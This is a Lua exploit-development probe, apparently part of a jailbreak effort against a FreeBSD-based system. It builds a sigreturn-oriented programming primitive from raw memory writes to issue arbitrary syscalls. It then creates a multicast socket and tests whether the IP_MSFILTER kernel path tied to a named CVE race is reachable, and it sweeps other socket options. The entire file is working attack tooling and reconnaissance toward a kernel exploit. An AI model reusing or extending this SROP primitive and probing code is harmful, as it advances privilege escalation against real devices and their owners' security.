-- CRASH_CLASS: LOW
-- PROBE 181a: IPv4 IP_MSFILTER + MCAST_MSFILTER reachability
--
-- CVE-2026-49412 patched both in_mcast.c (IPv4) and in6_mcast.c (IPv6).
-- 179a: IPv6 IPV6_MSFILTER(74) returned -1.
-- This tests the IPv4 path: IP_MSFILTER and MCAST_MSFILTER.
-- Also tests other multicast socket options that might have similar races.

print("=== 181a: IP4 MSFILTER REACHABILITY ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sca = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sca)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Constants
local AF_INET = 2
local SOCK_DGRAM = 2
local IPPROTO_IP = 0
local IP_ADD_MEMBERSHIP = 12   -- struct ip_mreq
local IP_MSFILTER = 74         -- FreeBSD ip_msfilter

-- Step 1: Create IPv4 DGRAM socket
print("")
print("--- STEP 1: AF_INET SOCKET ---")
local rv = srop(97, uint64(AF_INET), uint64(SOCK_DGRAM), uint64(0))
local s4 = rv and to_num(rv) or -1
print("socket=" .. s4)
if s4 < 0 then print("DEAD") return end

-- Step 2: Bind to INADDR_ANY
print("")
print("--- STEP 2: BIND ---")
local BIND = 0x1000
for i = 0, 0x1F, 4 do wd(gpu + BIND + i, 0) end
-- struct sockaddr_in: sin_len=16, sin_family=AF_INET(2), sin_port=0
wd(gpu + BIND, 0x00000210)  -- len=16, family=2, port=0
-- sin_addr = INADDR_ANY (0)
rv = srop(104, uint64(s4), ga(BIND), uint64(16))
local bret = rv and to_num(rv) or -999
print("bind=" .. bret)

-- Step 3: Join multicast group 224.0.0.1 (all hosts)
print("")
print("--- STEP 3: JOIN MULTICAST ---")
-- struct ip_mreq: imr_multiaddr (4 bytes) + imr_interface (4 bytes) = 8 bytes
local MREQ = 0x2000
-- 224.0.0.1 = 0xE0000001 → in LE dwords: 0x010000E0
wd(gpu + MREQ, 0x010000E0)
wd(gpu + MREQ + 4, 0)  -- INADDR_ANY interface
rv = srop(105, uint64(s4), uint64(IPPROTO_IP), uint64(IP_ADD_MEMBERSHIP),
    ga(MREQ), uint64(8))
local jret = rv and to_num(rv) or -999
print("IP_ADD_MEMBERSHIP=" .. jret)

-- Step 4: Try IP_MSFILTER (option 74)
print("")
print("--- STEP 4: IP_MSFILTER ---")
-- struct ip_msfilter:
--   struct in_addr imsf_multiaddr;    +0x00 (4 bytes)
--   struct in_addr imsf_interface;    +0x04 (4 bytes)
--   uint32_t      imsf_fmode;        +0x08
--   uint32_t      imsf_numsrc;       +0x0C
--   struct in_addr imsf_slist[1];     +0x10 (4 bytes each)
-- Total for 0 sources: 0x10 bytes
local IMF = 0x3000
for i = 0, 0x1F, 4 do wd(gpu + IMF + i, 0) end
wd(gpu + IMF, 0x010000E0)  -- 224.0.0.1
wd(gpu + IMF + 4, 0)       -- INADDR_ANY
wd(gpu + IMF + 8, 1)       -- MCAST_INCLUDE
wd(gpu + IMF + 12, 0)      -- 0 sources
rv = srop(105, uint64(s4), uint64(IPPROTO_IP), uint64(74),
    ga(IMF), uint64(0x10))
local mf = rv and to_num(rv) or -999
print("IP_MSFILTER(74, INCLUDE, 0src)=" .. mf)

if mf == 0 then
    print("!!! IP_MSFILTER WORKS !!!")
    print("!!! CVE-2026-49412 IPv4 PATH IS REACHABLE !!!")

    -- Try with 1 source
    wd(gpu + IMF + 12, 1)         -- 1 source
    wd(gpu + IMF + 16, 0x0100007F)  -- 127.0.0.1
    rv = srop(105, uint64(s4), uint64(IPPROTO_IP), uint64(74),
        ga(IMF), uint64(0x14))
    local mf2 = rv and to_num(rv) or -999
    print("IP_MSFILTER(74, INCLUDE, 1src)=" .. mf2)

    -- getsockopt
    local OLEN = 0x4000
    wd(gpu + OLEN, 0x100)
    rv = srop(118, uint64(s4), uint64(IPPROTO_IP), uint64(74),
        ga(IMF), ga(OLEN))
    local mg = rv and to_num(rv) or -999
    print("getsockopt(IP_MSFILTER)=" .. mg)
    if mg == 0 then
        print("  optlen=" .. rd(gpu + OLEN))
        print("  fmode=" .. rd(gpu + IMF + 8))
        print("  numsrc=" .. rd(gpu + IMF + 12))
    end
else
    -- Try alternative option numbers
    print("Trying alternatives...")
    for _, opt in ipairs({41, 46, 48, 69, 70, 71, 72, 73, 75, 76}) do
        rv = srop(105, uint64(s4), uint64(IPPROTO_IP), uint64(opt),
            ga(IMF), uint64(0x10))
        local alt = rv and to_num(rv) or -999
        if alt == 0 then
            print("  opt " .. opt .. "=0 !!!")
        end
    end

    -- Try MCAST_JOIN_SOURCE_GROUP (option 82, SOL_SOCKET level)
    -- struct group_source_req
    local GSR = 0x5000
    for i = 0, 0x10F, 4 do wd(gpu + GSR + i, 0) end
    wd(gpu + GSR, 0)  -- gsr_interface
    -- gsr_group = sockaddr_in for 224.0.0.1
    wd(gpu + GSR + 4, 0x00100002)  -- len=16, family=2
    wd(gpu + GSR + 8, 0x010000E0)  -- 224.0.0.1
    -- gsr_source = sockaddr_in for 127.0.0.1
    wd(gpu + GSR + 4 + 128, 0x00100002)
    wd(gpu + GSR + 8 + 128, 0x0100007F)  -- 127.0.0.1

    rv = srop(105, uint64(s4), uint64(IPPROTO_IP), uint64(82),
        ga(GSR), uint64(0x108))
    local mjsg = rv and to_num(rv) or -999
    print("MCAST_JOIN_SOURCE_GROUP(82)=" .. mjsg)

    -- Try at SOL_SOCKET level
    rv = srop(105, uint64(s4), uint64(0xFFFF), uint64(82),
        ga(GSR), uint64(0x108))
    print("MCAST_JOIN_SOURCE_GROUP(82,SOL)=" .. (rv and to_num(rv) or -999))
end

-- Step 5: Enumerate available socket options
print("")
print("--- STEP 5: SETSOCKOPT SWEEP ---")
-- Try options 40-90 at IPPROTO_IP to find which ones respond
for opt = 40, 90 do
    -- Use a 4-byte value of 0
    wd(gpu + 0x6000, 0)
    rv = srop(105, uint64(s4), uint64(IPPROTO_IP), uint64(opt),
        ga(0x6000), uint64(4))
    local r = rv and to_num(rv) or -999
    if r == 0 then
        print("  IPPROTO_IP opt " .. opt .. " = 0 (ACCEPTED)")
    end
end

srop(6, uint64(s4))
print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
